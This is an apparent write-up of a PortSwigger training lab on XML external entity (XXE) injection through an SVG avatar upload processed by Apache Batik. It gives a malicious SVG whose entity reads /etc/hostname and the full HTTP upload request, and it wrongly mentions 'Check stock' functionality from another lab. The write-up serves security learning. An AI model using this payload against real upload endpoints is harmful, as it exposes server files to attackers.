## Exploiting XXE via image file upload

**Title:** Exploiting XXE via image file upload. [Go](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) 

**Description:** This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 
 
## Preface

**XXE attacks via file upload**

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

**XXE attacks via modified content type**

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML. For example, if a normal request contains the following:

``` HTTP
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Then you might be able submit the following request, with the same result:

``` HTTP
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

## Methodology

### Finding the vulnerable parameter

While solving this lab we are interested in Check stock functionality.

### My Thought

We created a text file then saved this XML code and changed its extension to `.svg`.

``` XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
Then we posted a comment on a blog post and uploaded this image as an avatar. When we viewed our comment, we should see the contents of the `/etc/hostname` file in our image. We submitted the value of the server hostname and solved the lab.

**Request**

``` HTTP
POST /post/comment HTTP/2
Host: 0a0a0035040272d880d849aa005f007f.web-security-academy.net
Cookie: session=ZzsySAkz3PAbkKtvb5djxt7eWqPteQgP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------396565772112584950671156885671
Content-Length: 1238
Origin: https://0a0a0035040272d880d849aa005f007f.web-security-academy.net
Referer: https://0a0a0035040272d880d849aa005f007f.web-security-academy.net/post?postId=4
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="csrf"

OoDvRnfYUHFWNrPFxxrTrsO065EzrxxX
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="postId"

4
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="comment"

neogeo
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="name"

neogeo
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="avatar"; filename="pacman.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="email"

neogeo@neogeo.com
-----------------------------396565772112584950671156885671
Content-Disposition: form-data; name="website"

-----------------------------396565772112584950671156885671--
```

**Response**
``` HTTP
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=4
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
